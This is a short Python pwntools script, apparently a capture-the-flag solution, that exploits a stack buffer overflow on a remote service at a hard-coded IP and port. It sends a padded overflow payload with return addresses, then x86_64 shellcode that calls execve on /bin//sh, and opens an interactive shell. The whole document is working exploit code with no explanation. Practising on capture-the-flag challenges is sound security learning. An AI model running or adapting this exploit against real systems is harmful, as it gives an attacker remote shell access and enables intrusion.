from pwn import *

HOST = "178.62.249.106"
PORT = 8642
conn = remote(HOST, PORT)
payload = "A" * 0x70
#data 601170
payload += p64(0x601170)
payload += p64(0x40066f)
conn.sendline(payload)
binsh = "0x" + "/bin//sh"[::-1].encode('hex')
shellcode = asm('''
xor rsi, rsi
xor rdx, rdx
push rdx
mov rdi, {binsh}
push rdi
mov rdi, rsp
xor rax, rax
mov al, 59
syscall
'''.format(**locals()), arch="x86_64", os="linux", bits=64)
payload = shellcode
payload += "A" * (0x78 - len(payload))
payload += p64(0x601100)
conn.sendline(payload)
conn.interactive()
